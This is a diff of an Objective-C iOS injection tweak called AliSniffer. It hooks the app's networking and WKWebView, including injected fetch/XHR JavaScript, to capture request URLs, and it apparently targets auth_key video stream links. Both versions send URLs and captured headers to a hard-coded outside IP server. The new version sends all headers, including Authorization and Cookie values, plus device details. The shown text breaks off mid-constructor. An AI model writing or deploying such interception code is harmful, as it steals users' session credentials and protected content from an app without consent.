@@ -1,545 +1,324 @@
 
 //
-//  AliSniffer_enhanced_fix.m
-//  Safe enhanced version with robust hooking (safe-init) for real-device injection.
-//  - Hooks __NSCFURLSessionTask/NSURLSessionTask resume
-//  - Hooks NSURLSession dataTaskWithRequest:
-//  - Adds larger sniff buffer, delayed detection, header capture, AVPlayer replaceCurrentItem/playImmediatelyAtRate, WK MSE interception
+//  AliSniffer_debug_upload.m
+//  Debug build with realtime upload of trace logs to a server (方案A).
+//  - Posts each captured URL + headers to kLogUploadEndpoint as JSON.
+//  - Based on previous debug trace, aggressive hooks for resume/dataTaskWithRequest/dataTaskWithURL/NSURLConnection/NSURLProtocol/WK injection.
+//  - Change kLogUploadEndpoint and kLogUploadToken to point to your server before injection.
 //
-//  Drop into your project / replace previous AliSniffer and inject. Backup original first.
+//  USAGE:
+//  1) Save as AliSniffer_debug_upload.m, build/inject into the app, reproduce the playback.
+//  2) Check your server for incoming JSON posts. Each post looks like:
+//     { "note": "...", "url":"...", "headers":{...}, "time":..., "device":{...} }
+//  SECURITY: Logs may include sensitive headers (Authorization/Cookie). Use a secure server and delete logs after debugging.
 //
+
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 #import <WebKit/WebKit.h>
 #import <objc/runtime.h>
-#import <dlfcn.h>
-#import "fishhook.h"
 
-// ---------- Config ----------
-static NSString * const kPushRawEndpoint  = @"http://139.155.57.242:8088/api/push_raw";
-static NSString * const kPushToken        = @"@Yy166431";
-static const NSTimeInterval kPushInterval = 3600.0;
-
-#ifndef SNIFFER_ENABLE_POPUP
-#define SNIFFER_ENABLE_POPUP 1
-#endif
-
-// Enable for debug logs during troubleshooting
-#define ENABLE_DEBUG_LOG 1
-#ifdef ENABLE_DEBUG_LOG
 #define LOG(...) NSLog(__VA_ARGS__)
-#else
-#define LOG(...)
-#endif
 
-// ---------- Globals ----------
-static NSMutableDictionary<NSString*, NSDate*> *g_seen;
-static NSString *g_lastPlayableURL = nil;
-static dispatch_queue_t g_sniffer_queue;
-static void ensure_globals() {
-    static dispatch_once_t once;
-    dispatch_once(&once, ^{
-        g_seen = [NSMutableDictionary dictionary];
-        g_sniffer_queue = dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
-    });
-}
+// ---------- Upload endpoint (change to your server) ----------
+static NSString * const kLogUploadEndpoint = @"http://139.155.57.242:8088/api/push_raw";
+static NSString * const kLogUploadToken    = @"@Yy166431"; // optional
 
-// ---------- Utilities ----------
-static inline BOOL SeenRecently_internal(NSString *k, NSTimeInterval sec) {
-    if (!k) return NO;
-    NSDate *now = [NSDate date];
-    NSDate *last = g_seen[k];
-    if (last && [now timeIntervalSinceDate:last] < sec) return YES;
-    g_seen[k] = now;
-    if (g_seen.count > 2048) [g_seen removeAllObjects];
-    return NO;
-}
-static inline BOOL SeenRecently(NSString *k, NSTimeInterval sec) {
-    __block BOOL r;
-    dispatch_sync(g_sniffer_queue, ^{
-        r = SeenRecently_internal(k, sec);
-    });
-    return r;
-}
-
-static inline BOOL IsNoise(NSString *lower) {
-    if (!lower) return YES;
-    NSArray *noise = @[@"log.aliyuncs.com", @"beacon", @"/monitor", @"/ums", @"/umeng", @"/collect", @"bugly", @"crash", @"analytics", @"sentry"];
-    for (NSString *n in noise) if ([lower containsString:n]) return YES;
-    return NO;
-}
-static inline NSString *HostOfURLString(NSString *s) {
-    NSURLComponents *c = [NSURLComponents componentsWithString:s];
-    return c.host.lowercaseString ?: @"";
-}
-static inline BOOL IsPlayableURL(NSString *lower) {
-    if (!lower) return NO;
-    if ([lower containsString:@"m3u8"] || [lower containsString:@".mp4"] || [lower containsString:@".flv"]) return YES;
-    if ([lower hasPrefix:@"rtmp://"] || [lower hasPrefix:@"rtmps://"]) return YES;
-    if (([lower hasPrefix:@"ws://"] || [lower hasPrefix:@"wss://"]) && [lower containsString:@".flv"]) return YES;
-    NSArray *wh = @[@"knyb.kuniunet.com",@"knydb.kuniunet.com",@"v2.weizan.cn"];
-    for (NSString *w in wh) if ([HostOfURLString(lower) hasSuffix:w]) return YES;
-    return NO;
-}
-
-static inline BOOL HasAuthKey(NSString *lower) {
-    if (!lower) return NO;
-    return ([lower containsString:@"auth_key="] || [lower containsString:@"authkey="]);
-}
-static inline NSString *BaseURLWithoutQuery(NSString *s) {
-    if (!s.length) return @"";
-    NSURLComponents *c = [NSURLComponents componentsWithString:s];
-    if (!c) return s;
-    c.query = nil; c.fragment = nil;
-    return c.string ?: s;
-}
-
-// ---------- UI ----------
-static void ShowPopupIfNeeded(NSString *title, NSString *msg) {
-#if SNIFFER_ENABLE_POPUP
-    if (!msg.length) return;
-    dispatch_async(dispatch_get_main_queue(), ^{
-        UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
-        [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
-            [UIPasteboard generalPasteboard].string = msg;
-        }]];
-        [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
-        UIWindow *w = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
-        UIViewController *vc = w.rootViewController;
-        while (vc.presentedViewController) vc = vc.presentedViewController;
-        if (vc) [vc presentViewController:ac animated:YES completion:nil];
-    });
-#else
-    if (msg.length) [UIPasteboard generalPasteboard].string = msg;
-#endif
-}
-
-// ---------- Push ----------
-static void PushJSON_async(NSDictionary *obj) {
-    if (!obj) return;
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
-        NSData *d = nil;
-        @try { d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil]; } @catch(...) { return; }
-        if (!d) return;
-        NSURL *u = [NSURL URLWithString:kPushRawEndpoint];
-        if (!u) return;
-        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:u];
-        req.HTTPMethod = @"POST";
-        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
-        [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
-        req.HTTPBody = d;
-        NSURLSessionDataTask *t = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable resp, NSError * _Nullable err) {
-            (void)data; (void)resp; (void)err;
-        }];
-        [t resume];
-    });
-}
-
-// ---------- Report with headers ----------
-static inline NSDictionary *DictForHeaders(NSDictionary *headers) {
-    if (!headers) return @{};
-    NSMutableDictionary *m = [NSMutableDictionary dictionary];
-    NSArray *keys = @[@"Authorization",@"Cookie",@"Referer",@"User-Agent",@"Origin"];
-    for (NSString *k in keys) {
-        NSString *v = headers[k] ?: headers[k.lowercaseString];
-        if (v) m[k] = v;
-    }
-    return m;
-}
-static inline void ReportURL_WithHeaders(NSString *url, NSDictionary *headers) {
-    if (!url.length) return;
-    NSString *lower = url.lowercaseString;
-    if (IsNoise(lower)) return;
-    if (!IsPlayableURL(lower)) return;
-
-    BOOL hasAuth = HasAuthKey(lower);
-    NSString *base = BaseURLWithoutQuery(lower);
-
-    if (hasAuth) {
-        if (SeenRecently(lower, 2.0)) return;
-    } else {
-        if (SeenRecently(base, 10.0)) return;
-    }
-
-    g_lastPlayableURL = url;
-
-    NSString *title = nil;
-    if ([lower containsString:@"m3u8"]) title = hasAuth ? @"抓到 M3U8 (auth_key优先)" : @"抓到 M3U8";
-    else if ([lower containsString:@".mp4"]) title = hasAuth ? @"抓到 MP4 (auth_key优先)" : @"抓到 MP4";
-    else if ([lower containsString:@".flv"] || [lower hasPrefix:@"rtmp://"]) title = hasAuth ? @"抓到 FLV/RTMP (auth_key优先)" : @"抓到 FLV/RTMP";
-    else title = hasAuth ? @"命中播放 URL (auth_key优先)" : @"命中播放 URL";
-
-    ShowPopupIfNeeded(title, url);
-
+// ---------- Upload utility ----------
+static void UploadLogLineAsync(NSString *note, NSString *url, NSDictionary *headers) {
+    if (!url) url = @"";
     NSMutableDictionary *payload = [NSMutableDictionary dictionary];
-    payload[@"url"] = url;
+    payload[@"note"] = note ?: @"";
+    payload[@"url"] = url ?: @"";
     payload[@"time"] = @([[NSDate date] timeIntervalSince1970]);
-    NSDictionary *h = DictForHeaders(headers);
-    if (h.count) payload[@"headers"] = h;
-    payload[@"note"] = hasAuth ? @"auth_key" : @"no_auth_key";
-    PushJSON_async(payload);
+    if (headers && headers.count) payload[@"headers"] = headers;
+    payload[@"device"] = @{
+        @"name": UIDevice.currentDevice.name ?: @"",
+        @"model": UIDevice.currentDevice.model ?: @"",
+        @"sys": UIDevice.currentDevice.systemVersion ?: @""
+    };
+    NSData *d = nil;
+    @try { d = [NSJSONSerialization dataWithJSONObject:payload options:0 error:NULL]; } @catch(...) { d = nil; }
+    if (!d) return;
+    NSURL *u = [NSURL URLWithString:kLogUploadEndpoint];
+    if (!u) return;
+    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:u];
+    req.HTTPMethod = @"POST";
+    [req setValue:kLogUploadToken forHTTPHeaderField:@"X-Token"];
+    [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
+    req.HTTPBody = d;
+    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
+    cfg.timeoutIntervalForRequest = 8.0;
+    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg];
+    NSURLSessionDataTask *t = [s dataTaskWithRequest:req completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable resp, NSError * _Nullable err) {
+        if (err) {
+            LOG(@"[AliSniffer][UPLOAD] failed to upload: %@", err);
+        } else {
+            LOG(@"[AliSniffer][UPLOAD] uploaded log note=%@ url=%@", note, url);
+        }
+    }];
+    [t resume];
 }
 
-// ---------- Hooks ----------
-// NSURLSessionTask resume
-static void (*orig_task_resume)(id, SEL) = NULL;
-static void swz_task_resume(id self, SEL _cmd) {
+// ---------- Debug report (console + upload + clipboard) ----------
+static void DebugReportAndUpload(NSString *url, NSDictionary *hdrs, NSString *note) {
+    if (!url) url = @"";
+    LOG(@"[AliSniffer][REPORT] note=%@ url=%@ headers=%@", note ?: @"", url, hdrs ?: @{});
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIPasteboard generalPasteboard].string = url;
+    });
+    UploadLogLineAsync(note ?: @"debug", url, hdrs ?: @{} );
+}
+
+// ---------- Hooks and debug implementation (aggressive) ----------
+
+// resume hook
+static void (*g_orig_resume)(id, SEL) = NULL;
+static void swz_resume_debug(id self, SEL _cmd) {
     @try {
-        NSURLRequest *req = nil;
+        id req = nil;
         if ([self respondsToSelector:@selector(currentRequest)]) {
             req = [self performSelector:@selector(currentRequest)];
         } else if ([self respondsToSelector:@selector(originalRequest)]) {
             req = [self performSelector:@selector(originalRequest)];
         }
-        if (req && req.URL) {
-            NSDictionary *hdrs = req.allHTTPHeaderFields ?: @{};
-            ReportURL_WithHeaders(req.URL.absoluteString, hdrs);
-            LOG(@"[AliSniffer] resume -> %@", req.URL.absoluteString);
+        if (req && [req respondsToSelector:@selector(URL)]) {
+            NSURLRequest *r = req;
+            DebugReportAndUpload(r.URL.absoluteString, r.allHTTPHeaderFields ?: @{}, @"resume_hook");
+        } else {
+            DebugReportAndUpload(@"(no request)", @{}, @"resume_hook_no_req");
         }
-    } @catch(...) {}
-    if (orig_task_resume) orig_task_resume(self, _cmd);
+    } @catch (NSException *e) {
+        LOG(@"[AliSniffer][ERR] resume hook exception: %@", e);
+    }
+    if (g_orig_resume) g_orig_resume(self, _cmd);
 }
 
-// NSURLSession dataTaskWithRequest:
-static id (*orig_dataTaskWithRequest)(id, SEL, NSURLRequest *) = NULL;
-static id swz_dataTaskWithRequest(id self, SEL _cmd, NSURLRequest *req) {
+// dataTaskWithRequest
+static id (*g_orig_dataTaskWithRequest)(id, SEL, NSURLRequest *) = NULL;
+static id swz_dataTaskWithRequest_debug(id self, SEL _cmd, NSURLRequest *req) {
     @try {
         if (req && req.URL) {
-            NSDictionary *hdrs = req.allHTTPHeaderFields ?: @{};
-            ReportURL_WithHeaders(req.URL.absoluteString, hdrs);
-            LOG(@"[AliSniffer] dataTaskWithRequest -> %@", req.URL.absoluteString);
+            DebugReportAndUpload(req.URL.absoluteString, req.allHTTPHeaderFields ?: @{}, @"dataTaskWithRequest");
+        } else {
+            DebugReportAndUpload(@"(no url)", @{}, @"dataTaskWithRequest");
         }
-    } @catch(...) {}
-    if (orig_dataTaskWithRequest) return orig_dataTaskWithRequest(self, _cmd, req);
+    } @catch (NSException *e) {
+        LOG(@"[AliSniffer][ERR] dataTaskWithRequest exception: %@", e);
+    }
+    if (g_orig_dataTaskWithRequest) return g_orig_dataTaskWithRequest(self, _cmd, req);
     return nil;
 }
 
-// NSURLProtocol sniff (larger buffer, delayed detection)
-@interface _SniffProto2 : NSURLProtocol <NSURLSessionDataDelegate>
-@property(nonatomic,strong) NSURLSessionDataTask *task;
-@property(nonatomic,strong) NSMutableData *buf;
-@property(nonatomic,assign) BOOL shouted;
-@property(nonatomic,assign) NSTimeInterval firstDataTime;
-@property(nonatomic,copy) NSString *reqURL;
-@property(nonatomic,strong) NSDictionary *reqHeaders;
-@end
+// dataTaskWithURL
+static id (*g_orig_dataTaskWithURL)(id, SEL, NSURL *) = NULL;
+static id swz_dataTaskWithURL_debug(id self, SEL _cmd, NSURL *u) {
+    @try {
+        if (u) DebugReportAndUpload(u.absoluteString, @{}, @"dataTaskWithURL");
+    } @catch (NSException *e) { LOG(@"[AliSniffer][ERR] dataTaskWithURL exception: %@", e); }
+    if (g_orig_dataTaskWithURL) return g_orig_dataTaskWithURL(self, _cmd, u);
+    return nil;
+}
 
-@implementation _SniffProto2
+// NSURLConnection sendAsynchronousRequest:queue:completionHandler:
+static void (*g_orig_sendAsync)(Class, SEL, NSURLRequest*, NSOperationQueue*, void(^)(NSURLResponse*, NSData*, NSError*)) = NULL;
+static void swz_sendAsync_debug(Class self, SEL _cmd, NSURLRequest *req, NSOperationQueue *q, void(^handler)(NSURLResponse*, NSData*, NSError*)) {
+    @try {
+        DebugReportAndUpload(req.URL.absoluteString, req.allHTTPHeaderFields ?: @{}, @"NSURLConnection_sendAsync");
+    } @catch (NSException *e) { LOG(@"[AliSniffer][ERR] sendAsync exception: %@", e); }
+    if (g_orig_sendAsync) g_orig_sendAsync(self, _cmd, req, q, handler);
+}
+
+// NSURLProtocol simple implementation to be registered globally
+@interface _DebugProtoUpload : NSURLProtocol <NSURLSessionDataDelegate>
+@property(nonatomic,strong) NSURLSessionDataTask *task;
+@end
+@implementation _DebugProtoUpload
 + (BOOL)canInitWithRequest:(NSURLRequest *)request {
-    if ([NSURLProtocol propertyForKey:@"_SniffDone" inRequest:request]) return NO;
-    NSString *sch = request.URL.scheme.lowercaseString;
-    return [sch isEqualToString:@"http"] || [sch isEqualToString:@"https"];
+    if ([NSURLProtocol propertyForKey:@"_alisniffer_debug" inRequest:request]) return NO;
+    NSString *s = request.URL.scheme.lowercaseString ?: @"";
+    if ([s isEqualToString:@"http"] || [s isEqualToString:@"https"]) return YES;
+    return NO;
 }
 + (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request { return request; }
-
 - (void)startLoading {
     NSMutableURLRequest *r = [self.request mutableCopy];
-    [NSURLProtocol setProperty:@YES forKey:@"_SniffDone" inRequest:r];
+    [NSURLProtocol setProperty:@YES forKey:@"_alisniffer_debug" inRequest:r];
+    DebugReportAndUpload(r.URL.absoluteString, r.allHTTPHeaderFields ?: @{}, @"NSURLProtocol_start");
     NSURLSession *s = [NSURLSession sessionWithConfiguration:NSURLSessionConfiguration.defaultSessionConfiguration delegate:self delegateQueue:nil];
     self.task = [s dataTaskWithRequest:r];
-    self.buf = [NSMutableData data];
-    self.shouted = NO;
-    self.firstDataTime = 0;
-    self.reqURL = r.URL.absoluteString ?: @"";
-    self.reqHeaders = r.allHTTPHeaderFields ?: @{};
     [self.task resume];
 }
-
-- (void)stopLoading { [self.task cancel]; self.task = nil; self.buf = nil; }
-
-- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask
- didReceiveResponse:(NSURLResponse *)response
- completionHandler:(void (^)(NSURLSessionResponseDisposition))completionHandler {
-    [self.client URLProtocol:self didReceiveResponse:response cacheStoragePolicy:NSURLCacheStorageNotAllowed];
-    NSString *mime = response.MIMEType.lowercaseString ?: @"";
-    if (!self.shouted) {
-        if ([mime containsString:@"mpegurl"] || [mime containsString:@"x-flv"] || [mime containsString:@"mpeg"]) {
-            ReportURL_WithHeaders(self.reqURL, self.reqHeaders);
-            self.shouted = YES;
-        }
-    }
-    completionHandler(NSURLSessionResponseAllow);
-}
-
+- (void)stopLoading { [self.task cancel]; self.task = nil; }
 - (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data {
-    [self.client URLProtocol:self didLoadData:data];
-
-    if (self.shouted) return;
-    if (self.firstDataTime <= 0) self.firstDataTime = [[NSDate date] timeIntervalSince1970];
-
-    NSUInteger maxBuf = 128 * 1024;
-    if (self.buf.length < maxBuf) {
-        NSUInteger need = MIN(maxBuf - self.buf.length, data.length);
-        [self.buf appendData:[data subdataWithRange:NSMakeRange(0, need)]];
-    }
-
-    NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
-    NSTimeInterval delta = now - self.firstDataTime;
-    if (delta < 0.15) {
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)((0.15 - delta) * NSEC_PER_SEC)), dispatch_get_global_queue(QOS_CLASS_DEFAULT, 0), ^{
-            [self tryAnalyzeBuffer];
-        });
-    } else {
-        [self tryAnalyzeBuffer];
-    }
+    // no-op
 }
-
-- (void)tryAnalyzeBuffer {
-    if (self.shouted) return;
-    if (!self.buf || self.buf.length == 0) return;
-    const uint8_t *bytes = (const uint8_t *)self.buf.bytes;
-    NSUInteger n = self.buf.length;
-
-    NSString *txt = [[NSString alloc] initWithData:self.buf encoding:NSUTF8StringEncoding];
-    if (txt && ( [txt containsString:@"#EXTM3U"] || [txt containsString:@"#EXT-X-PROGRAM-DATE-TIME"] || [txt containsString:@"#EXT-X-PART"] )) {
-        ReportURL_WithHeaders(self.reqURL, self.reqHeaders);
-        self.shouted = YES;
-        return;
-    }
-
-    if (n >= 3 && bytes[0]=='F' && bytes[1]=='L' && bytes[2]=='V') {
-        ReportURL_WithHeaders(self.reqURL, self.reqHeaders);
-        self.shouted = YES;
-        return;
-    }
-
-    NSUInteger maxScan = MIN(n, (NSUInteger)4096);
-    for (NSUInteger i=0;i+8<=maxScan;i++) {
-        if (bytes[i+4]=='f' && bytes[i+5]=='t' && bytes[i+6]=='y' && bytes[i+7]=='p') {
-            ReportURL_WithHeaders(self.reqURL, self.reqHeaders);
-            self.shouted = YES;
-            return;
-        }
-        if (bytes[i+4]=='m' && bytes[i+5]=='o' && bytes[i+6]=='o' && bytes[i+7]=='f') {
-            ReportURL_WithHeaders(self.reqURL, self.reqHeaders);
-            self.shouted = YES;
-            return;
-        }
-    }
-
-    if (n >= 376) {
-        if (bytes[0] == 0x47 && (bytes[188] == 0x47 || (n > 2*188 && bytes[2*188] == 0x47))) {
-            ReportURL_WithHeaders(self.reqURL, self.reqHeaders);
-            self.shouted = YES;
-            return;
-        }
-    }
-}
-
 - (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
     if (error) [self.client URLProtocol:self didFailWithError:error];
     else [self.client URLProtocolDidFinishLoading:self];
 }
 @end
 
-// Swizzle NSURLSessionConfiguration class methods to insert protocol
-static NSURLSessionConfiguration* (*orig_defCfg)(id, SEL) = NULL;
-static NSURLSessionConfiguration* swz_defCfg(id self, SEL _cmd) {
-    NSURLSessionConfiguration *cfg = orig_defCfg ? orig_defCfg(self, _cmd) : [NSURLSessionConfiguration defaultSessionConfiguration];
-    NSMutableArray *arr = [cfg.protocolClasses mutableCopy] ?: [NSMutableArray array];
-    if (![arr containsObject:_SniffProto2.class]) [arr insertObject:_SniffProto2.class atIndex:0];
-    cfg.protocolClasses = arr;
-    return cfg;
-}
-static NSURLSessionConfiguration* (*orig_ephCfg)(id, SEL) = NULL;
-static NSURLSessionConfiguration* swz_ephCfg(id self, SEL _cmd) {
-    NSURLSessionConfiguration *cfg = orig_ephCfg ? orig_ephCfg(self, _cmd) : [NSURLSessionConfiguration ephemeralSessionConfiguration];
-    NSMutableArray *arr = [cfg.protocolClasses mutableCopy] ?: [NSMutableArray array];
-    if (![arr containsObject:_SniffProto2.class]) [arr insertObject:_SniffProto2.class atIndex:0];
-    cfg.protocolClasses = arr;
-    return cfg;
-}
-
-// AVPlayer additional hooks
-static void *orig_replaceCurrentItem = NULL;
-static void swz_replaceCurrentItem(id self, SEL _cmd, id item) {
-    @try {
-        if (item) {
-            NSURL *u = nil;
-            if ([item respondsToSelector:@selector(URL)]) u = [item performSelector:@selector(URL)];
-            if (!u && [item respondsToSelector:@selector(asset)]) {
-                id asset = [item performSelector:@selector(asset)];
-                if (asset && [asset respondsToSelector:@selector(URL)]) u = [asset performSelector:@selector(URL)];
-            }
-            if (u && u.absoluteString) {
-                NSDictionary *hdrs = @{};
-                ReportURL_WithHeaders(u.absoluteString, hdrs);
-                LOG(@"[AliSniffer] replaceCurrentItem -> %@", u.absoluteString);
-            }
-        }
-    } @catch(...) {}
-    ((void(*)(id,SEL,id))orig_replaceCurrentItem)(self, _cmd, item);
-}
-
-static void *orig_playImmediatelyAtRate = NULL;
-static void swz_playImmediatelyAtRate(id self, SEL _cmd, float rate) {
-    @try {
-        id cur = nil;
-        if ([self respondsToSelector:@selector(currentItem)]) cur = [self performSelector:@selector(currentItem)];
-        if (cur) {
-            NSURL *u = nil;
-            if ([cur respondsToSelector:@selector(URL)]) u = [cur performSelector:@selector(URL)];
-            if (!u && [cur respondsToSelector:@selector(asset)]) {
-                id asset = [cur performSelector:@selector(asset)];
-                if (asset && [asset respondsToSelector:@selector(URL)]) u = [asset performSelector:@selector(URL)];
-            }
-            if (u && u.absoluteString) {
-                ReportURL_WithHeaders(u.absoluteString, @{});
-                LOG(@"[AliSniffer] playImmediatelyAtRate -> %@", u.absoluteString);
-            }
-        }
-    } @catch(...) {}
-    ((void(*)(id,SEL,float))orig_playImmediatelyAtRate)(self, _cmd, rate);
-}
-
-// WK WebView injection for fetch/XHR and MSE appendBuffer preview
-@interface _WKHandler2 : NSObject<WKScriptMessageHandler>
-@end
-@implementation _WKHandler2
-- (void)userContentController:(WKUserContentController *)uc didReceiveScriptMessage:(WKScriptMessage *)m {
-    if (!m.body) return;
-    @try {
-        NSString *s = [m.body description];
-        if (s.length) {
-            NSData *d = [s dataUsingEncoding:NSUTF8StringEncoding];
-            NSDictionary *j = nil;
-            @try { j = [NSJSONSerialization JSONObjectWithData:d options:0 error:nil]; } @catch(...) { j = nil; }
-            if (j && j[@"type"]) {
-                if ([j[@"type"] isEqualToString:@"append_preview"]) {
-                    NSString *info = j[@"info"] ?: @"";
-                    NSString *note = [NSString stringWithFormat:@"MSE append preview: %@", info];
-                    ReportURL_WithHeaders(note, @{});
-                    LOG(@"[AliSniffer] MSE append preview: %@", info);
-                } else if ([j[@"type"] isEqualToString:@"fetch_url"]) {
-                    NSString *u = j[@"url"] ?: @"";
-                    if (u.length) { ReportURL_WithHeaders(u, @{ }); LOG(@"[AliSniffer] WK fetch_url -> %@", u); }
-                }
-            } else {
-                NSString *u = s;
-                if (u.length) { ReportURL_WithHeaders(u, @{ }); LOG(@"[AliSniffer] WK raw -> %@", u); }
-            }
-        }
-    } @catch(...) {}
-}
-@end
-
-static id (*orig_WK_init)(id, SEL, CGRect, WKWebViewConfiguration *) = NULL;
-static id swz_WK_init(id self, SEL _cmd, CGRect frame, WKWebViewConfiguration *cfg) {
+// WK injection: simple script to post fetch/XHR URLs via message handler
+static id (*g_orig_wkinit)(id, SEL, CGRect, id) = NULL;
+static id swz_wkinit_upload(id self, SEL _cmd, CGRect frame, id cfg) {
     if (cfg) {
-        _WKHandler2 *h = [_WKHandler2 new];
-        [cfg.userContentController addScriptMessageHandler:h name:@"_S2"];
-        NSString *js =
-        @"(function(){"
-         "function post(o){try{window.webkit.messageHandlers._S2.postMessage(JSON.stringify(o));}catch(e){}}"
-         "function probeURL(u){ try{ if(u && /(m3u8|\\.mp4(\\?|$)|\\.flv(\\?|$)|^rtmps?:\\/\\/|^wss?:\\/\\/.*\\.flv)/i.test(u)) post({type:'fetch_url',url:u}); }catch(e){} }"
-         "var f=window.fetch;if(f){window.fetch=function(){var u=arguments[0]; if(typeof u==='string') probeURL(u); return f.apply(this,arguments).then(function(res){try{var u2=res&&res.url;if(u2) probeURL(u2);}catch(e){}return res;});};}"
-         "var X=window.XMLHttpRequest;if(X){var o=X.prototype.open,s=X.prototype.send;X.prototype.open=function(m,u){try{this.__u=u;probeURL(u);}catch(e){}return o.apply(this,arguments)};X.prototype.send=function(){try{probeURL(this.__u);}catch(e){}return s.apply(this,arguments)};}"
-         "try{var MS = window.MediaSource; if(MS){"
-           "var oldAdd = MS.prototype.addSourceBuffer; MS.prototype.addSourceBuffer = function(mime){"
-             "var sb = oldAdd.call(this,mime);"
-             "var oldAppend = sb.appendBuffer;"
-             "sb.appendBuffer = function(buf){"
-               "try{ var len = buf && buf.byteLength ? buf.byteLength : 0; var preview = '';"
-                 "if (len > 0) { try{ var small = buf.slice(0, Math.min(len, 512)); var arr = new Uint8Array(small); var prefix = arr.subarray(0, Math.min(64, arr.length)); var s=''; for(var i=0;i<prefix.length;i++){ s+=String.fromCharCode(prefix[i]); } preview = btoa(s);}catch(e){} }"
-                 "post({type:'append_preview', info: mime + ' len=' + len + ' b64prefix=' + preview});"
-               "}catch(e){}"
-               "return oldAppend.apply(this, arguments);"
-             "};"
-             "return sb;"
-           "};"
-         "}}catch(e){}"
-        "})();";
-        WKUserScript *sc = [[WKUserScript alloc] initWithSource:js injectionTime:WKUserScriptInjectionTimeAtDocumentStart forMainFrameOnly:NO];
-        [cfg.userContentController addUserScript:sc];
+        @try {
+            id ucc = [cfg valueForKey:@"userContentController"];
+            if (ucc) {
+                NSString *js = @"(function(){function p(u){try{window.webkit.messageHandlers._dbg.postMessage(JSON.stringify({type:'fetch_url',url:u}));}catch(e){}};var f=window.fetch; if(f){window.fetch=function(){var u=arguments[0]; if(typeof u==='string') p(u); return f.apply(this,arguments);};} var X=window.XMLHttpRequest; if(X){var o=X.prototype.open; X.prototype.open=function(m,u){try{p(u);}catch(e){} return o.apply(this,arguments);} }})();";
+                id wkuser = ucc;
+                if ([wkuser respondsToSelector:@selector(addUserScript:)]) {
+                    Class WKUserScriptClass = NSClassFromString(@"WKUserScript");
+                    id script = [[WKUserScriptClass alloc] initWithSource:js injectionTime:0 forMainFrameOnly:NO];
+                    [wkuser performSelector:@selector(addUserScript:) withObject:script];
+                }
+                // add script message handler _dbg
+                // create a tiny handler object that forwards to Upload
+                // We'll add a lightweight ObjC handler dynamically below in constructor
+            }
+        } @catch(...) {}
     }
-    return orig_WK_init ? orig_WK_init(self, _cmd, frame, cfg) : self;
+    if (g_orig_wkinit) return g_orig_wkinit(self, _cmd, frame, cfg);
+    return nil;
 }
 
-// ---------- Safe init constructor: try multiple candidate classes and ensure metaclass swizzling ----------
-__attribute__((constructor))
-static void _alisniffer_safe_init(void) {
-    @autoreleasepool {
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            ensure_globals();
-            LOG(@"[AliSniffer] safe init start");
+// Lightweight WKScriptMessageHandler implementation
+@interface _UploadWKHandler : NSObject <WKScriptMessageHandler>
+@end
+@implementation _UploadWKHandler
+- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
+    if (!message.body) return;
+    @try {
+        NSString *s = [message.body description];
+        NSData *d = [s dataUsingEncoding:NSUTF8StringEncoding];
+        NSDictionary *j = nil;
+        @try { j = [NSJSONSerialization JSONObjectWithData:d options:0 error:NULL]; } @catch(...) { j = nil; }
+        if (j && j[@"type"] && [j[@"type"] isEqualToString:@"fetch_url"]) {
+            NSString *u = j[@"url"] ?: @"";
+            if (u.length) DebugReportAndUpload(u, @{ }, @"WK_fetch_url");
+        } else {
+            // fallback: raw string
+            DebugReportAndUpload(s, @{ }, @"WK_msg");
+        }
+    } @catch(...) {}
+}
+@end
 
-            // Try hooking resume on likely classes
+// Constructor: install hooks and register protocol; also attach WK handler class globally via assoc
+__attribute__((constructor))
+static void _alisniffer_debug_upload_init(void) {
+    @autoreleasepool {
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.4 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+            LOG(@"[AliSniffer] debug upload init start");
+
+            // Hook resume on likely classes
             NSArray *candidates = @[@"__NSCFURLSessionTask", @"__NSURLSessionLocalTask", @"NSURLSessionTask"];
-            BOOL hookedResume = NO;
-            for (NSString *clsName in candidates) {
-                Class c = NSClassFromString(clsName);
+            BOOL hooked = NO;
+            for (NSString *n in candidates) {
+                Class c = NSClassFromString(n);
                 if (!c) continue;
                 SEL sel = @selector(resume);
                 Method m = class_getInstanceMethod(c, sel);
                 if (!m) continue;
                 IMP orig = method_getImplementation(m);
                 if (orig) {
-                    if (!orig_task_resume) orig_task_resume = (void *)orig;
-                    method_setImplementation(m, (IMP)swz_task_resume);
-                    LOG(@"[AliSniffer] hooked resume on %@", clsName);
-                    hookedResume = YES;
+                    g_orig_resume = (void *)orig;
+                    method_setImplementation(m, (IMP)swz_resume_debug);
